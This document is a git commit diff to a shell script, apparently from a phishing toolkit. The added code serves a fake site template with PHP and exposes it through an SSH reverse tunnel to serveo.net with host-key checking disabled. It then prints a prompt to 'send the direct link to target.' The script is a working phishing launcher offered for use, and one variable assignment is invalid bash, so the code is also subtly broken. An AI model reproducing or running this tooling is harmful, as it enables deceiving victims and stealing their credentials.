76000d94bc79fcf2071690f3db9a9e2ef200cd18
Ironozd <ironoziron@gmail.com>
2019-06-16 20:37:46 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -14,6 +14,21 @@ printf "\n"
 
 start(){
 
+$port="5872"
 
-
+  printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+cd site/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
+sleep 2
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+printf "\n"
+sleep 10
+send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+printf "\n"
+printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+printf "\n"
 }
